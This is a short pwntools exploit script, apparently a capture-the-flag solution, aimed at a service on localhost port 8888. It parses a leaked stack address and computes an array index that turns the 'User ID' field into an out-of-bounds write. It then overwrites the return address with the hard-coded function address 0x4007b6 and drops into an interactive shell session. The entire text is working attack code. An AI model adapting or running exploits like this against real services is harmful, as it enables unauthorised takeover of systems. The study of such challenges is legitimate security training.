#!/usr/bin/env python

from pwn import *
context.arch='amd64'
r = remote('127.0.0.1', 8888)

r.recvuntil('Stack Ref = ')
ret_addr = int(r.recvline(), 16) - 24
print 'ret_addr @', hex(ret_addr)

r.recvuntil('User ID: ')
r.sendline(str((ret_addr - 0x601040) / 8))
r.recvuntil('Nickname: ')
r.sendline(p64(0x4007b6)[:-1])

r.interactive()
